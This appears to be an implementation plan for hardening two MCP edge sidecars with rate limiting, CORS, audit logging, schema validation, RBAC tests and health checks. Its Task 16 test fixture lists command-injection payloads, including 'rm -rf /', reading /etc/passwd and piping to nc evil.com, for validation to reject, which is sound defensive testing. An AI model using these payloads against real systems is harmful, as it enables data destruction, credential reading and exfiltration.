# HDIM MCP Edge — Security Hardening Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development to implement this plan task-by-task.

**Goal:** Harden both MCP edge sidecars with rate limiting, CORS lockdown, structured audit logging, request schema validation, deep health checks, and complete devops RBAC coverage — bringing Layer 1 to production-ready security posture.

**Architecture:** Add security middleware (rate limiting, CORS, schema validation) to the existing Express pipeline, structured logging via pino, and deep health probes. All changes are additive — no breaking changes to existing tool handlers.

**Tech Stack:** express-rate-limit, pino, ajv, cors (existing), supertest (existing), jest (existing)

---

## Stream A: Rate Limiting (T1–T3)

### Task 1: Install express-rate-limit and write failing tests

**Files:**
- Modify: `mcp-edge-common/package.json`
- Create: `mcp-edge-common/__tests__/rate-limit.test.js`
- Create: `mcp-edge-common/lib/rate-limit.js`

**Step 1: Install dependency**

```bash
cd mcp-edge-common && npm install express-rate-limit
```

**Step 2: Write failing tests**

Create `mcp-edge-common/__tests__/rate-limit.test.js`:

```javascript
const { createRateLimiter } = require('../lib/rate-limit');

describe('createRateLimiter', () => {
  it('returns express middleware function', () => {
    const limiter = createRateLimiter();
    expect(typeof limiter).toBe('function');
    expect(limiter.length).toBe(3); // req, res, next
  });

  it('respects custom windowMs and max options', () => {
    const limiter = createRateLimiter({ windowMs: 1000, max: 5 });
    expect(typeof limiter).toBe('function');
  });

  it('uses env vars for defaults', () => {
    process.env.MCP_EDGE_RATE_LIMIT_MAX = '50';
    process.env.MCP_EDGE_RATE_LIMIT_WINDOW_MS = '30000';
    const limiter = createRateLimiter();
    expect(typeof limiter).toBe('function');
    delete process.env.MCP_EDGE_RATE_LIMIT_MAX;
    delete process.env.MCP_EDGE_RATE_LIMIT_WINDOW_MS;
  });
});
```

**Step 3: Run test — expect FAIL** (module not found)

```bash
npx jest --projects mcp-edge-common --testPathPatterns rate-limit
```

**Step 4: Implement minimal `rate-limit.js`**

```javascript
const rateLimit = require('express-rate-limit');

function createRateLimiter(options = {}) {
  const windowMs = options.windowMs
    || Number(process.env.MCP_EDGE_RATE_LIMIT_WINDOW_MS)
    || 60_000; // 1 minute
  const max = options.max
    || Number(process.env.MCP_EDGE_RATE_LIMIT_MAX)
    || 100;

  return rateLimit({
    windowMs,
    max,
    standardHeaders: true,
    legacyHeaders: false,
    skip: (req) => req.path === '/health',
    message: {
      jsonrpc: '2.0',
      id: null,
      error: {
        code: -32000,
        message: 'Rate limit exceeded',
        data: { retryAfterMs: windowMs }
      }
    }
  });
}

module.exports = { createRateLimiter };
```

**Step 5: Run test — expect PASS**

**Step 6: Export from index.js**

Add `createRateLimiter` to `mcp-edge-common/index.js` exports.

**Step 7: Commit**

```bash
git add mcp-edge-common/
git commit -m "feat(mcp-edge): add rate limiter factory with env-configurable defaults"
```

### Task 2: Integration tests — rate limiting rejects after threshold

**Files:**
- Modify: `mcp-edge-common/__tests__/rate-limit.test.js`

**Step 1: Add integration tests using supertest**

```javascript
const express = require('express');
const supertest = require('supertest');
const { createRateLimiter } = require('../lib/rate-limit');

describe('rate limiter integration', () => {
  let app, request;

  beforeEach(() => {
    app = express();
    app.use(createRateLimiter({ windowMs: 60_000, max: 3 }));
    app.post('/mcp', (req, res) => res.json({ ok: true }));
    app.get('/health', (req, res) => res.json({ status: 'healthy' }));
    request = supertest(app);
  });

  it('allows requests under the limit', async () => {
    const res = await request.post('/mcp');
    expect(res.status).toBe(200);
  });

  it('returns 429 after exceeding max', async () => {
    for (let i = 0; i < 3; i++) await request.post('/mcp');
    const res = await request.post('/mcp');
    expect(res.status).toBe(429);
    expect(res.body.error.code).toBe(-32000);
    expect(res.body.error.message).toBe('Rate limit exceeded');
  });

  it('sets RateLimit-* standard headers', async () => {
    const res = await request.post('/mcp');
    expect(res.headers['ratelimit-limit']).toBeDefined();
    expect(res.headers['ratelimit-remaining']).toBeDefined();
  });

  it('skips /health endpoint', async () => {
    for (let i = 0; i < 5; i++) await request.get('/health');
    const res = await request.get('/health');
    expect(res.status).toBe(200);
  });
});
```

**Step 2: Run tests — expect PASS**

**Step 3: Commit**

```bash
git commit -m "test(mcp-edge): add rate limiter integration tests with threshold + skip"
```

### Task 3: Wire rate limiter into both sidecars

**Files:**
- Modify: `mcp-edge-platform/server.js`
- Modify: `mcp-edge-devops/server.js`

**Step 1: Add rate limiter to both server.js files**

After `app.use(express.json({ limit: '1mb' }));` add:

```javascript
const { createRateLimiter } = require('hdim-mcp-edge-common');
app.use(createRateLimiter());
```

**Step 2: Run full test suite**

```bash
npx jest --projects mcp-edge-common mcp-edge-platform mcp-edge-devops
```

**Step 3: Commit**

```bash
git commit -m "feat(mcp-edge): wire rate limiter into platform and devops sidecars"
```

---

## Stream B: CORS Lockdown (T4–T5)

### Task 4: Write failing tests for configurable CORS

**Files:**
- Create: `mcp-edge-common/__tests__/cors-config.test.js`
- Create: `mcp-edge-common/lib/cors-config.js`

**Step 1: Write failing tests**

```javascript
const { createCorsOptions } = require('../lib/cors-config');

describe('createCorsOptions', () => {
  afterEach(() => { delete process.env.MCP_EDGE_CORS_ORIGINS; });

  it('defaults to localhost origins when no env set', () => {
    const opts = createCorsOptions();
    expect(opts.origin).toContain('http://localhost:3000');
    expect(opts.credentials).toBe(false);
  });

  it('parses comma-separated env origins', () => {
    process.env.MCP_EDGE_CORS_ORIGINS = 'https://app.hdim.io,https://admin.hdim.io';
    const opts = createCorsOptions();
    expect(opts.origin).toEqual(['https://app.hdim.io', 'https://admin.hdim.io']);
  });

  it('allows wildcard via env for dev mode', () => {
    process.env.MCP_EDGE_CORS_ORIGINS = '*';
    const opts = createCorsOptions();
    expect(opts.origin).toBe('*');
  });

  it('trims whitespace from origins', () => {
    process.env.MCP_EDGE_CORS_ORIGINS = ' https://a.com , https://b.com ';
    const opts = createCorsOptions();
    expect(opts.origin).toEqual(['https://a.com', 'https://b.com']);
  });
});
```

**Step 2: Implement `cors-config.js`**

```javascript
const DEFAULT_ORIGINS = [
  'http://localhost:3000',
  'http://localhost:3100',
  'http://localhost:3200',
  'http://127.0.0.1:3000',
  'http://127.0.0.1:3100',
  'http://127.0.0.1:3200'
];

function createCorsOptions() {
  const envOrigins = process.env.MCP_EDGE_CORS_ORIGINS;

  let origin;
  if (!envOrigins) {
    origin = DEFAULT_ORIGINS;
  } else if (envOrigins.trim() === '*') {
    origin = '*';
  } else {
    origin = envOrigins.split(',').map(o => o.trim()).filter(Boolean);
  }

  return { origin, credentials: false };
}

module.exports = { createCorsOptions };
```

**Step 3: Run tests, commit**

### Task 5: Wire CORS config into both sidecars + integration test

**Files:**
- Modify: `mcp-edge-platform/server.js`
- Modify: `mcp-edge-devops/server.js`
- Modify: `mcp-edge-common/index.js`

Replace `cors({ origin: '*', credentials: false })` with:

```javascript
const { createCorsOptions } = require('hdim-mcp-edge-common');
app.use(cors(createCorsOptions()));
```

Add integration test verifying CORS headers in platform security.test.js:

```javascript
it('rejects requests from disallowed origins', async () => {
  const res = await request.options('/mcp')
    .set('Origin', 'https://evil.com')
    .set('Access-Control-Request-Method', 'POST');
  expect(res.headers['access-control-allow-origin']).not.toBe('https://evil.com');
});
```

**Commit after tests pass.**

---

## Stream C: Structured Audit Logging (T6–T8)

### Task 6: Install pino and create audit logger

**Files:**
- Modify: `mcp-edge-common/package.json`
- Create: `mcp-edge-common/lib/audit-log.js`
- Create: `mcp-edge-common/__tests__/audit-log.test.js`

**Step 1: Install**

```bash
cd mcp-edge-common && npm install pino
```

**Step 2: Write tests**

```javascript
const { createAuditLogger, scrubSensitive } = require('../lib/audit-log');

describe('createAuditLogger', () => {
  it('returns a pino logger instance', () => {
    const logger = createAuditLogger({ serviceName: 'test' });
    expect(typeof logger.info).toBe('function');
    expect(typeof logger.error).toBe('function');
  });

  it('logs to provided writable stream', () => {
    const { Writable } = require('node:stream');
    const chunks = [];
    const stream = new Writable({
      write(chunk, enc, cb) { chunks.push(chunk.toString()); cb(); }
    });
    const logger = createAuditLogger({ serviceName: 'test', stream });
    logger.info({ tool: 'edge_health', role: 'admin' }, 'tool_call');
    expect(chunks.length).toBe(1);
    const log = JSON.parse(chunks[0]);
    expect(log.tool).toBe('edge_health');
    expect(log.role).toBe('admin');
    expect(log.service).toBe('test');
  });
});

describe('scrubSensitive', () => {
  it('removes Bearer tokens from strings', () => {
    expect(scrubSensitive('Bearer abc123xyz')).toBe('Bearer [REDACTED]');
  });

  it('removes patient_id fields from objects', () => {
    const obj = { patient_id: '12345', status: 'ok' };
    const scrubbed = scrubSensitive(obj);
    expect(scrubbed.patient_id).toBe('[REDACTED]');
    expect(scrubbed.status).toBe('ok');
  });

  it('returns primitives unchanged', () => {
    expect(scrubSensitive(42)).toBe(42);
    expect(scrubSensitive(null)).toBe(null);
  });
});
```

**Step 3: Implement**

```javascript
const pino = require('pino');

const SENSITIVE_KEYS = ['patient_id', 'ssn', 'mrn', 'password', 'secret', 'api_key'];

function scrubSensitive(value) {
  if (typeof value === 'string') {
    return value.replace(/Bearer\s+\S+/g, 'Bearer [REDACTED]');
  }
  if (value && typeof value === 'object') {
    const copy = { ...value };
    for (const key of SENSITIVE_KEYS) {
      if (key in copy) copy[key] = '[REDACTED]';
    }
    return copy;
  }
  return value;
}

function createAuditLogger({ serviceName, stream } = {}) {
  const options = {
    name: serviceName || 'mcp-edge',
    level: process.env.LOG_LEVEL || 'info',
    base: { service: serviceName },
    timestamp: pino.stdTimeFunctions.isoTime,
    formatters: {
      level(label) { return { level: label }; }
    }
  };

  return stream ? pino(options, stream) : pino(options);
}

module.exports = { createAuditLogger, scrubSensitive };
```

**Step 4: Run, commit**

### Task 7: Add audit logging middleware to MCP router

**Files:**
- Modify: `mcp-edge-common/lib/mcp-router.js`
- Create: `mcp-edge-common/__tests__/audit-logging.test.js`

**Step 1: Write tests**

Test that tool calls produce audit log entries with: role, tool, success/fail, duration_ms. Test that errors produce audit entries. Test that no PHI appears in log output.

**Step 2: Modify `createMcpRouter` to accept `logger` option**

In the `handleToolsCall` function, after tool execution completes, emit:

```javascript
logger.info({
  tool: name,
  role: operatorRole,
  success: !error,
  duration_ms: Date.now() - start,
  demo: isDemoMode()
}, 'tool_call');
```

On error:

```javascript
logger.error({
  tool: name,
  role: operatorRole,
  error_code: errorResponse.error.code,
  duration_ms: Date.now() - start
}, 'tool_error');
```

**Step 3: Run, commit**

### Task 8: Wire audit logger into both sidecars

**Files:**
- Modify: `mcp-edge-platform/server.js`
- Modify: `mcp-edge-devops/server.js`
- Modify: `mcp-edge-platform/index.js`
- Modify: `mcp-edge-devops/index.js`

Replace `console.log` startup messages with pino logger calls. Pass logger to `createMcpRouter`.

**Commit after tests pass.**

---

## Stream D: DevOps RBAC Matrix (T9)

### Task 9: Create devops RBAC exhaustive matrix — 49 test cases

**Files:**
- Create: `mcp-edge-devops/__tests__/rbac-matrix.test.js`

**Step 1: Write the 49-case test**

```javascript
const { createApp } = require('../server');
const supertest = require('supertest');

beforeAll(() => { process.env.HDIM_DEMO_MODE = 'true'; });
afterAll(() => { delete process.env.HDIM_DEMO_MODE; });

jest.setTimeout(30_000);

const ROLE_TOOL_MATRIX = {
  platform_admin:   { edge_health: true, docker_status: true, docker_logs: true, docker_restart: true, service_dependencies: true, compose_config: true, build_status: true },
  developer:        { edge_health: true, docker_status: true, docker_logs: true, docker_restart: true, service_dependencies: true, compose_config: true, build_status: true },
  clinical_admin:   { edge_health: true, docker_status: false, docker_logs: false, docker_restart: false, service_dependencies: false, compose_config: false, build_status: false },
  quality_officer:  { edge_health: true, docker_status: false, docker_logs: false, docker_restart: false, service_dependencies: false, compose_config: false, build_status: false },
  executive:        { edge_health: true, docker_status: false, docker_logs: false, docker_restart: false, service_dependencies: false, compose_config: false, build_status: false },
  clinician:        { edge_health: true, docker_status: false, docker_logs: false, docker_restart: false, service_dependencies: false, compose_config: false, build_status: false },
  care_coordinator: { edge_health: true, docker_status: false, docker_logs: false, docker_restart: false, service_dependencies: false, compose_config: false, build_status: false },
};

describe('RBAC exhaustive matrix — devops edge (7 roles × 7 tools)', () => {
  let request;
  beforeAll(() => { request = supertest(createApp()); });

  const cases = [];
  for (const [role, tools] of Object.entries(ROLE_TOOL_MATRIX)) {
    for (const [tool, allowed] of Object.entries(tools)) {
      cases.push([role, tool, allowed]);
    }
  }

  it.each(cases)('%s %s → %s', async (role, tool, allowed) => {
    const res = await request.post('/mcp')
      .set('x-operator-role', role)
      .send({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: tool, arguments: {} } });
    if (allowed) {
      expect(res.body.error).toBeUndefined();
      expect(res.body.result).toBeDefined();
    } else {
      expect(res.body.error).toBeDefined();
      expect(res.body.error.data.reason).toBe('forbidden_for_role');
    }
  });
});
```

**Step 2: Run, commit**

---

## Stream E: Request Schema Validation (T10–T12)

### Task 10: Install ajv and create param validator

**Files:**
- Modify: `mcp-edge-common/package.json`
- Create: `mcp-edge-common/lib/param-validator.js`
- Create: `mcp-edge-common/__tests__/param-validator.test.js`

**Step 1: Install**

```bash
cd mcp-edge-common && npm install ajv
```

**Step 2: Write tests**

```javascript
const { validateToolParams } = require('../lib/param-validator');

describe('validateToolParams', () => {
  const schema = {
    type: 'object',
    properties: {
      service: { type: 'string', maxLength: 100 },
      tail: { type: 'integer', minimum: 1, maximum: 10000 }
    },
    required: ['service'],
    additionalProperties: false
  };

  it('returns null for valid params', () => {
    expect(validateToolParams(schema, { service: 'gateway', tail: 50 })).toBeNull();
  });

  it('returns error for missing required field', () => {
    const err = validateToolParams(schema, {});
    expect(err).not.toBeNull();
    expect(err).toContain('service');
  });

  it('returns error for extra properties', () => {
    const err = validateToolParams(schema, { service: 'gw', evil: 'code' });
    expect(err).not.toBeNull();
  });

  it('returns error for type mismatch', () => {
    const err = validateToolParams(schema, { service: 123 });
    expect(err).not.toBeNull();
  });

  it('returns null for empty schema (no validation needed)', () => {
    const emptySchema = { type: 'object', properties: {} };
    expect(validateToolParams(emptySchema, {})).toBeNull();
  });

  it('handles null/undefined params gracefully', () => {
    expect(validateToolParams(schema, null)).not.toBeNull();
    expect(validateToolParams(schema, undefined)).not.toBeNull();
  });
});
```

**Step 3: Implement**

```javascript
const Ajv = require('ajv');

const ajv = new Ajv({
  strict: true,
  removeAdditional: false,
  coerceTypes: false,
  allErrors: false
});

function validateToolParams(schema, params) {
  if (!schema || !schema.properties) return null;
  const validate = ajv.compile(schema);
  const valid = validate(params ?? {});
  if (valid) return null;
  return validate.errors.map(e =>
    `${e.instancePath || '/'}: ${e.message}`
  ).join('; ');
}

module.exports = { validateToolParams };
```

**Step 4: Run, commit**

### Task 11: Wire param validation into MCP router

**Files:**
- Modify: `mcp-edge-common/lib/mcp-router.js`
- Modify: `mcp-edge-common/__tests__/mcp-router.test.js`

**Step 1: Add tests**

```javascript
it('rejects params that violate tool inputSchema', async () => {
  // Register a tool with strict schema
  const res = await request.post('/mcp')
    .set('x-operator-role', 'platform_admin')
    .send({
      jsonrpc: '2.0', id: 1, method: 'tools/call',
      params: { name: 'docker_logs', arguments: { service: '', tail: -1 } }
    });
  expect(res.body.error).toBeDefined();
  expect(res.body.error.code).toBe(-32602);
});
```

**Step 2: In `handleToolsCall`, after auth check and before handler:**

```javascript
const { validateToolParams } = require('./param-validator');
const validationError = validateToolParams(tool.inputSchema, args);
if (validationError) {
  return jsonRpcError(id, -32602, 'Invalid params', { reason: 'invalid_params', detail: validationError });
}
```

**Step 3: Run, commit**

### Task 12: Add inputSchema to all tools that lack strict validation

**Files:**
- Audit all tool definition files in both sidecars
- Add proper `inputSchema` with `additionalProperties: false` to any tool missing strict schema

**Commit after tests pass.**

---

## Stream F: Deep Health Checks (T13–T15)

### Task 13: Add downstream probe to edge_health

**Files:**
- Modify: `mcp-edge-platform/lib/tools/edge-health.js`
- Modify: `mcp-edge-devops/lib/tools/edge-health.js`
- Create: `mcp-edge-common/__tests__/deep-health.test.js`

**Step 1: Write tests**

Test that platform edge_health includes `downstream.gateway` with `reachable: true/false`.
Test that devops edge_health includes `downstream.docker` with `reachable: true/false`.
Test that when downstream is unreachable, status becomes `degraded` (not `unhealthy`).

**Step 2: Platform edge_health — probe gateway**

```javascript
let gatewayReachable = false;
try {
  const res = await fetch(
    `${process.env.HDIM_BASE_URL || 'http://localhost:18080'}/actuator/health`,
    { signal: AbortSignal.timeout(3000) }
  );
  gatewayReachable = res.ok;
} catch { /* unreachable */ }
```

**Step 3: DevOps edge_health — probe docker socket**

Use `child_process.execFile` (not exec, to avoid shell injection):

```javascript
const { execFile } = require('node:child_process');
const { promisify } = require('node:util');
const execFileAsync = promisify(execFile);

let dockerReachable = false;
try {
  await execFileAsync('docker', ['info', '--format', '{{.ServerVersion}}'], { timeout: 3000 });
  dockerReachable = true;
} catch { /* unreachable */ }
```

**Step 4: Return status `degraded` when downstream unreachable**

**Step 5: Commit**

### Task 14: Health endpoint returns degraded status

**Files:**
- Modify: `mcp-edge-common/lib/health.js`
- Modify: `mcp-edge-common/__tests__/health.test.js`

Add test that `statusProvider` returning `status: 'degraded'` produces HTTP 200 (not 503).
Add test that `statusProvider` returning `status: 'unhealthy'` produces HTTP 503.

Modify health router to return 503 when status is `unhealthy`.

**Commit after tests pass.**

### Task 15: Integration test — deep health in demo mode

**Files:**
- Create: `mcp-edge-platform/__tests__/deep-health.test.js`
- Create: `mcp-edge-devops/__tests__/deep-health.test.js`

Test that in demo mode, edge_health returns `downstream` info.
Test response includes all expected fields: status, service, version, uptime, timestamp, downstream.

**Commit after tests pass.**

---

## Stream G: Docker Security Tests (T16)

### Task 16: Docker client command injection proof

**Files:**
- Create: `mcp-edge-devops/__tests__/docker-security.test.js`

Test that the following injection patterns are all rejected at the tool level:

```javascript
const INJECTION_PAYLOADS = [
  '; rm -rf /',
  '$(cat /etc/passwd)',
  '`whoami`',
  '| nc evil.com 1234',
  '../../../etc/passwd',
  'service\nARG2',
  'service\x00injected',
  'service --privileged',
  '-v /:/host'
];
```

Each payload should be rejected by `SERVICE_NAME_PATTERN` validation before reaching `docker compose`.

**Commit after tests pass.**

---

## Stream H: Coverage & Validation Report (T17–T18)

### Task 17: Run full test suite with coverage

**Run:**

```bash
npx jest --projects mcp-edge-common mcp-edge-platform mcp-edge-devops --coverage --coverageProvider=v8
NODE_OPTIONS='--experimental-vm-modules' npx jest --config '{}' --testMatch '**/scripts/mcp/__tests__/**'
```

Target: >99% statement coverage, >95% branch coverage, 100% function coverage.

### Task 18: Write hardening validation report

**File:** Create `docs/plans/2026-03-04-hdim-mcp-edge-hardening-report.md`

Document:
- All new security controls added
- Test counts by category
- Coverage metrics before and after
- Remaining gaps (JWT deferred to Layer 4)
- HIPAA/CISO audit readiness checklist

**Commit after writing.**

---

## Dependency Graph

```
T1 (rate-limit lib) → T2 (integration tests) → T3 (wire into sidecars)
T4 (CORS config) → T5 (wire + integration)
T6 (audit logger) → T7 (router middleware) → T8 (wire into sidecars)
T9 (devops RBAC matrix) — independent
T10 (param validator) → T11 (wire into router) → T12 (add schemas to tools)
T13 (deep health) → T14 (health HTTP status) → T15 (integration)
T16 (docker injection proof) — independent
T17 (coverage) — depends on all above
T18 (report) — depends on T17
```

## Parallel Execution Plan

| Wave | Tasks | Description |
|------|-------|-------------|
| 1 | T1, T4, T6, T9, T10, T16 | Independent foundations |
| 2 | T2, T5, T7, T11, T13 | Integration + wiring |
| 3 | T3, T8, T12, T14, T15 | Final wiring + deep health |
| 4 | T17 | Coverage report |
| 5 | T18 | Validation report |
